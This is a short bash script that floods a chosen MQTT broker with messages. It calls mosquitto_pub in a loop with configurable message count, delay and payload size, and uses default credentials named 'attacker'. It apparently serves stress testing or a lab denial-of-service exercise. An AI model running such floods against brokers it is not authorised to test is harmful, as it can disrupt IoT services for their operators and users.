#!/usr/bin/env bash
if [ "${#}" -ge 1 ]; then
	TARGET="${1}"
    PORT="${2:-1883}"
    COUNT="${COUNT:-1000}"
    DELAY_MS="${DELAY_MS:-0}"
    PAYLOAD_SIZE="${PAYLOAD_SIZE:-0}"
    MQTT_USER="${MQTT_USER:-attacker}"
    MQTT_PASS="${MQTT_PASS:-attackerpass}"

    function delay() {
        if [ "${DELAY_MS}" -gt 0 ]; then
            sleep "$(printf "%d.%03d" $((DELAY_MS / 1000)) $((DELAY_MS % 1000)))"
        fi
    }

    for i in $( seq 1 "${COUNT}" ); do
        if [ "${PAYLOAD_SIZE}" -gt 0 ]; then
            MSG=$(head -c "${PAYLOAD_SIZE}" /dev/zero | tr "\0" "M")
        else
            MSG="Message with ID: ${i}"
        fi
        mosquitto_pub -h "${TARGET}" -p "${PORT}" -u "${MQTT_USER}" -P "${MQTT_PASS}" -i mosq_pub1 -t "Test ${i}" -m "${MSG}"
        delay
    done
fi
